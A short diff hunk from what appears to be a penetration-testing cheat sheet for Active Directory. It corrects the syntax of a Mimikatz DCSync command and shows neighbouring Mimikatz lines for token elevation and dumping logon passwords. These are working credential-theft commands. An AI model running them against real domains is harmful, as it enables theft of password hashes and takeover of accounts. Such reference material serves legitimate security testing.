@@ -227,7 +227,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 
 #### Mimikatz DCSync attack specific user
 ```
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\<USER>"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<USER> /domain:<DOMAIN>"'
 ```
 
 #### Mimikatz DCSync attack everything
